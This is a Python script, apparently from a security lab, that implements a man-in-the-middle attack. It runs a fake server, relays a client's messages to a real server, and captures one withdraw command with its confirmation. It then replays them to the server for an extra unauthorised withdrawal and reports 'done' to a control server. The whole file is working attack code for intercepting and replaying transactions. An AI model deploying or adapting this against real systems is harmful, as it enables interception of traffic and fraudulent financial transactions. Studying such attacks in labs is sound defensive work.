#!/usr/bin/python3
import ast
import socket
import signal
import requests
import argparse
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from contextlib import contextmanager


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def send_done_to_cs(ip, port):
    url = "http://%s:%s" % (ip, port)
    payload = { "REQUEST": '{ "type": "done" }' }
    
    requests.post(url, data=payload)


def withdraw_from_server(ip, port, withdraw_command, withdraw_command_dot, confirmation):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.send(withdraw_command)
        s.send(withdraw_command_dot)
        data = s.recv(1024)
        data = s.recv(1024)
        s.send(confirmation)


def stop_mitm(*args):
    with ignored(Exception):
        client.shutdown(socket.SHUT_RDWR)
        client.close()
        server.shutdown(socket.SHUT_RDWR)
        server.close()
        fake_server.shutdown(socket.SHUT_RDWR)
        fake_server.close()


def start_mitm(port, server_ip, server_port, cs_ip, cs_port):
    signal.signal(signal.SIGTERM, stop_mitm)

    try:
        fake_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fake_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        fake_server.bind(("0.0.0.0", port))
        fake_server.listen(1)
        count = 0
        withdraw_command = None
        withdraw_command_dot = None
        withdraw_command_confirmation = None

        while 1:
            print(count)
            client, address = fake_server.accept()

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((server_ip, server_port))

            message = client.recv(1024)
            message_dot = client.recv(1024)
            
            server.send(message)
            server.send(message_dot)

            response = server.recv(1024)
            response_dot = server.recv(1024)
            
            client.send(response)
            client.send(response_dot)

            confirmation = client.recv(1204)
            server.send(confirmation)

            if count == 2:
                withdraw_command = message
                withdraw_command_dot = message_dot
                withdraw_command_confirmation = confirmation

            if count == 3 and withdraw_command:
                withdraw_from_server(server_ip, server_port, withdraw_command, withdraw_command_dot, withdraw_command_confirmation)
                withdraw_command = None
                withdraw_command_dot = None
                withdraw_command_confirmation = None
                send_done_to_cs(cs_ip, cs_port)

            server.close()
            client.close()
            count += 1
    except KeyboardInterrupt:
        stop_mitm()



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, default=4000)
    parser.add_argument('-s', type=str, default="127.0.0.1")
    parser.add_argument('-q', type=int, default=3000)
    parser.add_argument('-c', type=str, default="127.0.0.1")
    parser.add_argument('-d', type=int, default=5000)
    args = parser.parse_args()

    print('started', flush=1)
    
    start_mitm(args.p, args.s, args.q, args.c, args.d)
